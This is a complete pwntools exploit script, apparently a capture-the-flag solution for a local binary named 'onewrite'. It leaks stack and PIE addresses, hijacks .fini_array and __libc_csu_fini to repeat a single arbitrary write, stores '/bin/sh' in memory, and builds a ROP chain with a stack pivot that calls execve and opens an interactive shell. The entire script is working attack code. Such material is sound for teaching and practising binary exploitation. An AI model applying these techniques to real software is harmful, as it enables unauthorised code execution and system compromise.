from pwn import *


target = process('./onewrite')
gdb.attach(target, gdbscript='b *do_overwrite+81')
elf = ELF('onewrite')


def leak(opt):
    target.recvuntil('> ')
    target.send(str(opt))
    leak_addr = int(target.recvline().strip(), 16)
    return leak_addr


def write(addr, payload):
    target.recvuntil('address : ')
    target.send(str(addr))
    target.recvuntil('data : ')
    target.send(payload)


stack_addr = leak(1)
print(f'stack: {hex(stack_addr)}')
rip_addr = stack_addr + 0x18

# overwrite the least byte of the address with 0x4, which should point to do_leak's call
write(rip_addr, p8(0x04))

do_leak_addr = leak(2)
print(f'do_leak_addr: {hex(do_leak_addr)}')

pie_base = do_leak_addr - elf.symbols['do_leak']
print(f'pie_base: {hex(pie_base)}')


# overwrite methods in .fini_array with do_overwrite
fini_array_addr = pie_base + \
    elf.symbols['__do_global_dtors_aux_fini_array_entry']
do_overwrite_addr = pie_base + elf.symbols['do_overwrite']

write(fini_array_addr + 0x8, p64(do_overwrite_addr))
write(fini_array_addr, p64(do_overwrite_addr))


# create a loop on the teardown method
csu_rip_addr = stack_addr - 72
csu_fini_addr = pie_base + elf.symbols['__libc_csu_fini']
write(csu_rip_addr, p64(csu_fini_addr))
print(f'csu_fini_addr: {hex(csu_fini_addr)}')
print(f'csu_rip_addr: {hex(csu_rip_addr)}')

# each time we call __libc_csu_fini the return address will shift by 0x8
csu_rip_addr += 0x8


# from now on we can loop on writing with this method
def write_loop(addr, payload):
    write(addr, payload)
    global csu_rip_addr
    write(csu_rip_addr, p64(csu_fini_addr))
    csu_rip_addr += 0x8


# ROP
bss_addr = do_leak_addr + 0x2aa99b
binsh = p64(0x0068732f6e69622f) # /bin/sh in LSB
write_loop(bss_addr, binsh)
print(f'/bin/sh written to: {hex(bss_addr)}')

mov = pie_base + 0x77901  # mov qword ptr [rsi], rax ; ret
rsi = pie_base + 0xd9f2  # pop rsi ; ret
rax = pie_base + 0x460ac  # pop rax ; ret
rdi = pie_base + 0x84fa  # pop rdi ; ret
rdx = pie_base + 0x484c5  # pop rdx ; ret
syscall = pie_base + 0x917c  # syscall

write_loop(stack_addr + 0xd0, p64(rax))
write_loop(stack_addr + 0xd8, p64(0x3b))
write_loop(stack_addr + 0xe0, p64(rdi))
write_loop(stack_addr + 0xe8, p64(bss_addr))
write_loop(stack_addr + 0xf0, p64(rsi))
write_loop(stack_addr + 0xf8, p64(0))
write_loop(stack_addr + 0x100, p64(rdx))
write_loop(stack_addr + 0x108, p64(0))
write_loop(stack_addr + 0x110, p64(syscall))
print('ROP written')


rsp_pivot = pie_base + 0x106f3
do_overwrite_rsp_addr = stack_addr - 0x10
print(f'rsp_pivot to be written at: {hex(do_overwrite_rsp_addr)}')
write(do_overwrite_rsp_addr, p64(rsp_pivot)) # no more need to loop, simple write
print(f'rsp_pivot written')

target.interactive()
